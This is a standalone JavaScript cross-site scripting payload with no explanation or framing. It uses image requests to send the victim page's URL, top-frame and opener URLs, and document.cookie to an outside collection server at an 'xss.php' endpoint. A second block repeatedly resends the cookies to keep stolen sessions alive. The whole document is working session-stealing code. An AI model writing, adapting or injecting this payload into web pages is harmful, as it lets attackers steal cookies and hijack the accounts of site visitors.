(function() {
    (new Image()).src = 'http://xss.azwines.com.cn/xss.php?do=api&id=Jg3G&location=' + escape((function() {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&cookie=' + escape((function() {
        try {
            return document.cookie
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());
})();
if ('1' == 1) {
    keep = new Image();
    keep.src = 'http://xss.azwines.com.cn/xss.php?do=keepsession&id=Jg3G&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};